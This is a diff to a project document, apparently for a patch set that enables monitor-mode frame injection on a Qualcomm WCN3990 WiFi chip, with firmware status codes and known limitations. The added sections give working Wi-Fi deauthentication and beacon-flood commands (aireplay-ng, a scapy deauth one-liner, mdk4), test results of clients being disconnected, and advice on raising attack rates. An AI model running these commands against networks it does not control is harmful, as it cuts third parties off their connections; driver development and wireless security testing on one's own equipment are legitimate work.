@@ -108,22 +108,73 @@ User's phone associated to WiFi Mateo 2.4G (real AP with BSSID
 `8a:c2:27:a1:19:cc`, our own AP for testing) disconnected during the
 30-frame burst — confirming OTA delivery.
 
+## Confirmed working commands
+
+```
+# Setup monitor iface (destroys wlan0 assoc):
+sudo airmon-ng start wlan0     # -> wlan0mon on ch 10 default
+sudo iw dev wlan0mon set channel <N>
+
+# Test injection (official aircrack-ng test):
+sudo aireplay-ng -9 wlan0mon
+# Output: "Injection is working!"
+
+# Deauth attack -- use -D to skip AP beacon detection (aireplay's
+# default requires seeing a beacon of the target BSSID first):
+sudo aireplay-ng -D --deauth 0 -a <BSSID> -c <CLIENT_MAC> wlan0mon
+
+# Broadcast deauth (against all clients of AP):
+sudo aireplay-ng -D --deauth 0 -a <BSSID> wlan0mon
+
+# scapy raw injection (also works):
+sudo python3 -c "from scapy.all import *; \
+  p=RadioTap()/Dot11(type=0,subtype=12,addr1='<CLIENT>',addr2='<BSSID>',addr3='<BSSID>')/Dot11Deauth(reason=7); \
+  [sendp(p, iface='wlan0mon', verbose=0) for _ in range(20)]"
+
+# capture:
+sudo airodump-ng --bssid <BSSID> -w <prefix> wlan0mon
+```
+
+## Test evidence
+
+- `aireplay-ng -9 wlan0mon` → "Injection is working!" (aircrack's official probe test passes)
+- `aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT> wlan0mon` → 640 frames sent, 99 status=0, no fw crash, target client observed disconnecting
+- `scapy sendp()` on wlan0mon → 20 frames unicast, 16 status=0 (80% radiated), target dropped from AP
+- Sustained burst 60s at 8pps: 438/438 status=0 (100%) for broadcast deauth
+- `mdk4 b -c 11` (beacon flood): works, ~48 pps sustained
+- `airodump-ng` on wlan0mon: captures beacons + data normally
+- No fw crash / hw restart during sustained tests
+
+## Firmware status codes handled
+
+WMI_MGMT_TX_COMP_STATUS_TYPE values reported by WCN3990 fw:
+- 0 = COMPLETE_OK (radiated, ACKed if unicast)
+- 1 = DISCARD (never on air — fw dropped before HW submission)
+- 2 = COMPLETE_NO_ACK (radiated, no ACK from target)
+- 3 = INSPECT (radiated, fw wants host to inspect — treated as success)
+- \>=4 = extended status word, normalized via `status & 0x3`
+
+For injection use case:
+- Status 0, 2, 3 → frame radiated OTA (mac80211 sees ACK for 0)
+- Status 1 → not radiated (real failure, mac80211 sees no-ack)
+
 ## Known limitations
 
-1. **`aireplay-ng -9` fails at 0%** — aireplay does two-way TX/RX
-   (sends probe, expects response). Our TX works, but the fw's
-   mgmt-rx path drops responses that arrive addressed to the hidden
-   STA vdev's MAC (we generate a random LAA MAC that no AP knows).
-   Injection is verified via `tcpdump` loopback. This is a rx-filter
-   quirk; the TX itself is fine.
-2. **Data-frame unicast injection** on monitor still broken (fw crash on
+1. **Data-frame unicast injection** on monitor still broken (fw crash on
    peerless data path). Deauth/probe-req/action work because they're
    mgmt frames that go through the WMI path. Broadcast data works via
    patch 0115 (aireplay `--arpreplay` on broadcast).
-3. **First frame after boot creates the hidden vdev** — takes ~400ms
+2. **First frame after boot creates the hidden vdev** — takes ~400ms
    (msleep 150+150+100). Subsequent frames reuse it.
-4. **Channel change requires teardown/recreate** of the hidden vdev.
+3. **Channel change requires teardown/recreate** of the hidden vdev.
    Auto-recreated on next injection if user changes channel.
+4. **aireplay-ng default deauth waits for beacon** — use `-D` to skip
+   AP detection, or run `airodump-ng --bssid <BSSID>` in another
+   terminal first so aireplay sees the beacon.
+5. **Aireplay --deauth radiation rate ~46%** with a burst of 640 fps
+   (99/214 completions status=0). Frames still hit target because AP
+   only needs 1 deauth to trigger client disconnect. For 100%
+   radiation use lower rate (~8-20 fps via scapy).
 
 ## Files layout
 
